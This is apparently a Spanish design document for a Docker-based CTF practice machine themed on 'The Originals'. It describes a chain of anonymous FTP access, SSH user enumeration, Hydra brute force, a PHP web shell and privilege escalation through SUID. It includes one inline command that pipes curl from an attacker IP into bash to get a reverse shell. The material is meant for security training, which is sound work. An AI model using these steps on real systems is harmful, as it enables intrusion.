# **Máquina: Diseño Inseguro**

## Objetivo
Esta máquina está específicamente diseñada para explotar la vulnerabilidad ***A04:2021 - Diseño Inseguro*** y otras vulnerabilidades.

## Planteamiento
Para cumplir con este objetivo, la máquina alojará varios servicios como **FTP**, **SSH** y **Apache**.

Estos servicios se encontrarán expuestos externamente para que cuando el atacante realice un reconocimiento pueda detectarlos.

El servicio **FTP** podrá ser accesible de forma anónima.

El servicio de **SSH** no tendrá ninguna función más que despistar al atacante.

El servicio de **apache** alojará nuestra pagina web la cual esta inspirada en la serie **Los Originales**. La web será vulnerable a la vulnerabilidad **Diseño Inseguro**, la cual estará enfocada a una gestión insegura de los permisos de usuarios FTP.

****

Para comenzar el atacante realizará un reconocimiento de los servicios expuestos por la maquina, y de primeras podrá ver que el servicio **FTP** es propenso a hacer un login mediante el usuario de **anonymous** y que el **SSH** es propenso a enumeración de usuarios.

Cuando el atacante se ponga a revisar la web y realizar **FUZZING** para descubrir subdirectorios ocultos, encontrará el directorio **secret**, el cual al intentar acceder no tendra permisos de lectura.

Si el atacante sigue revisando la web, encontrará que no hay ningun vector de entrada a través de la pagina web, por lo cual se pondrá a probar que puede hacer con el usuario de **anonymous** en **FTP**, pero se dará cuenta que con este usuario tampoco puede realizar acciones importantes para vulnerar la maquina.

El atacante se pondrá a revisar mejor la web y verá que se hablan de personajes de la serie, por lo cual se creará un diccionario con nombres de usuario relacionados con los personajes de la serie **Los Originales**, de esta forma el atacante utilizará una herramienta de **Python** para enumerar los usuarios existentes del sistema mediante **SSH**, consiguiendo encontrar al usuario **Elijah** existente en la maquina.

Una vez el atacante sepa que el usuario **Elijah** existe en la maquina, utilizará la herramienta **Hydra** junto con el diccionario de contraseñas **rockyou.txt** y el usuario **Elijah** para realizar un ataque de fuerza bruta e intentar averiguar la contraseña del usuario atacando al servicio de **FTP**, de esta forma obtendremos la contraseña del usuario **Elijah** para acceder al **FTP**.

Cuando el atacante acceda al **FTP** con el usuario de **Elijah** podrá ver que puede visualizar un directorio **Elijah**, en el cual despues de probar a realizar que acciones puede hacer, verá que puede subir ficheros dentro de este directorio **Elijah**, de esta forma el atacante subira un fichero **cmd.php** el cual tendrá codigo en PHP para realizar una **RCE**.

Sabiendo todo esto, el atacante accederá al directorio **secret** dentro de la web y verá que dentro de **secret** existe **Elijah**, de esta forma llegará a la conclusión que el fichero con el **RCE** que ha subido dentro de **Elijah** por **FTP** esta sincronizado con los directorios de la web, por lo que si accede a este fichero y ejecuta **cmd=whoami** y por pantalla le muestra **www-data** verá que tiene ejecución remota de comandos.

De esta forma el atacante, se creará un **index.html** con codigo para ejecutarse una **reverse shell** en **bash**, se creará un servicio **HTTP** y se pondra en escucha por el **puerto 443**, dentro de la url hará que la maquina realice un **curl** a la IP del atacante y "pipeara" el resultado con **bash** **(http://IpMaquina/cmd.php?cmd=curl IpAtacante | bash)**, realizando esto obtendremos una **reverse shell** y obtendremos acceso a la maquina como **www-data** en donde realizaremos un tratamiento de la **TTY**.

Una vez ya tenemos acceso como **www-data** dentro de la maquina, encontraremos una imagen del persone **Caroline**. dicha imagen tendrá un zip llamado **backupPasswords.zip** en **/var/www/**, cifrado con una contraseña, la cual podremos crackear con **zip2john** para obtener el **hash** y despues crackear el **hash** con la herramienta de **John**.

Cuando hagamos el unzip del fichero, el atacante verá otro fichero con muchas contraseñas, y utilizará estas contraseñas para acceder con otro usuario del sistema llamado **Caroline**, de esta forma podrá **moverse lateralmente** a este usuario.

Con el usuario **Caroline**, podremos visualizar la flag **user.txt** en el directorio **/home/caroline/**, además el atacante verá que tiene permisos de SUID sobre un fichero en especifico, el cual este permiso le permitirá escalar sus privilegios al usuario de root.

Una vez tenga acceso con el usuario **root**, el atacante podrá visualizar el flag de **root.txt** dentro de **/root/**, además de obtener acceso completo a toda la maquina.

## Configuración del entorno
Para configurar el entorno utilizaremos un contenedor Docker con el sistema operativo Ubuntu Server. Los servicios que utilizaremos son:

- **FTP**: *vsftpd* version 3.0.3 --> Para transferencia de archivos.
- **SSH**: *OpenSSH 9.6p1*/7.2p2 --> Para acceso remoto seguro.
- **HTTP**: *Apache 2.4.58* --> Para el servidor web.
 
## Pasos a seguir

1. **Instalación de Docker**
2. **Creación del Dockerfile**
3. **Verificación de contenedor Docker**
4. **Primeras pruebas de Docker**
5. **Configuración de la máquina y paquetes**
6. **Testeo de vulnerabilidades**
7. **Aplicar mejoras y corregir errores/problemas**
8. **Volver a testear las vulnerabilidades**
9. **Redactar el reporte y documentación final**
